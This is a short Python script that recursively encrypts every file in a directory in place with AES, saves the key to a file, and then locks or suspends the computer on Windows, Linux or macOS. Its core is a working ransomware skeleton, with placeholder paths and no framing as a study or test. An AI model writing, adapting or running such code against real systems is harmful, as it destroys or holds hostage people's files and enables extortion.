import os
import base64
import platform
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_EAX)
    with open(file_path, 'rb') as f:
        data = f.read()
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, 'wb') as f:
        f.write(nonce + tag + ciphertext)

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            encrypt_file(os.path.join(root, file), key)

def lock_screen():
    system = platform.system()
    if system == "Windows":
        os.system('rundll32.exe user32.dll,LockWorkStation')
    elif system == "Linux":
        os.system("systemctl suspend")
    elif system == "Darwin":
        os.system("pmset sleepnow")
    elif system == "Android" or system == "iOS":
        # For mobile devices, you can use ADB or other tools to lock the screen
        # Example for Android: os.system("adb shell input keyevent 26")
        pass

def main():
    key = get_random_bytes(16)  # 128-bit key for AES
    encrypt_directory('/path/to/encrypt', key)
    with open('/path/to/key.txt', 'wb') as f:
        f.write(base64.b64encode(key))

    # Lock the screen
    lock_screen()

if __name__ == '__main__':
    main()